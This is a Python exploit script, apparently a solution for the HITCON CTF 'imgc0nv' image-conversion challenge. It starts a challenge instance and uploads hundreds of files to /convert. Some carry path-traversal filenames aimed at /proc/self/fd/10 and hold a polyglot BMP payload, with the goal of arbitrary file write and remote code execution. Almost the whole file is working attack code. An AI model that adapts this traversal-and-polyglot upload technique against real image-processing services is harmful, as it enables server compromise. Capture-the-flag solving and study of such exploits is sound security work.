#!/usr/bin/env python3
import requests
import io
import threading
from PIL import Image
import time
import re
import requests

BASE = "http://imgc0nv.chal.hitconctf.com"
TOKEN = "csaiojcsaucsahcsahiucsiahcsaihcsai"

HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": f"{BASE}/",
}


CHALL_URL = "http://imgc0nv.chal.hitconctf.com:30616"

def construct_target_arbw_path(x) -> str:
    final_path = f"/tmp/../../usr/lib/m/proc/self/fd/{x}e//../../../../../proc/self/fd/{x}"
    return final_path

def build_benign_image() -> bytes:
    bio = io.BytesIO()
    Image.new("RGB", (1, 1), (0, 0, 255)).save(bio, format="PNG")
    return bio.getvalue()

def build_files_payload():
    with open("poly.bmp", "rb") as f:
        buf = io.BytesIO(f.read())
        buf.seek(0)
    safe_image = build_benign_image()
    ff = io.BytesIO(safe_image).getvalue()
    
    files = []
    for x in range(450):
        files.append(("files", (f"testa_{x}", ff, "image/png")))

    for _ in range(1, 65):
        target_filename = construct_target_arbw_path(10)
        files.append( ("files", (target_filename, buf.getvalue(), "image/bmp")) )

    for x in range(450):
        files.append(("files", (f"testa_{x+32132}", ff, "image/png")))
    
    return files

def rce():
    target_ext = "im"
    
    files = build_files_payload()
    data = {"format": target_ext}

    print(f"Sending {len(files)} files to {CHALL_URL}/convert ...")
    r = requests.post(f"{CHALL_URL}/convert", files=files, data=data)
    print("POST /convert =>", r.status_code)
    print(r.text)

def exploit():
    session = requests.Session()

    def create():
        r = session.post(f"{BASE}/create", headers=HEADERS, data={"token": TOKEN})
        m = re.search(r'href="(http://imgc0nv\.chal\.hitconctf\.com:\d+)"', r.text)
        return m.group(1) if m else None

    def stop():
        session.post(f"{BASE}/stop", headers=HEADERS)

    stop()
    print("Instance stopped.")

    time.sleep(5)
    
    url = create()
    print("Instance URL:", url)

    rce()

    time.sleep(10)
    stop()
    print("Instance stopped.")

if __name__ == "__main__":
    rce_threads = []
    for n_pipe in range(0, 1):
        t = threading.Thread(target=exploit, args=())
        rce_threads.append(t)

    for t in rce_threads:
        t.start()
